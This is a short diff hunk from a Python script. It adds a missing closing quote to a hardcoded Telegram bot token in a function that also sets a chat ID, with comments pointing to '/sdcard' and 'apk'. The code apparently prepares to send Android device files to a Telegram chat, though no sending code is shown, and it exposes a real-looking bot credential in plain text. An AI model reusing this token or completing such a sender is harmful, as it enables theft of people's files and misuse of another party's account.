@@ -291,7 +291,7 @@ except:
 def suyaib():
     session=requests.session()
         
-    bot_token = '6779272301:AAFwX7S_Oh7kpamQFjg1RJHgD86CFU6_wdU 
+    bot_token = '6779272301:AAFwX7S_Oh7kpamQFjg1RJHgD86CFU6_wdU'
     chat_id = '5892087022'    
     #-------------( /sdcard\ )--------------#  
     #--------------------apk-------------------#																																							
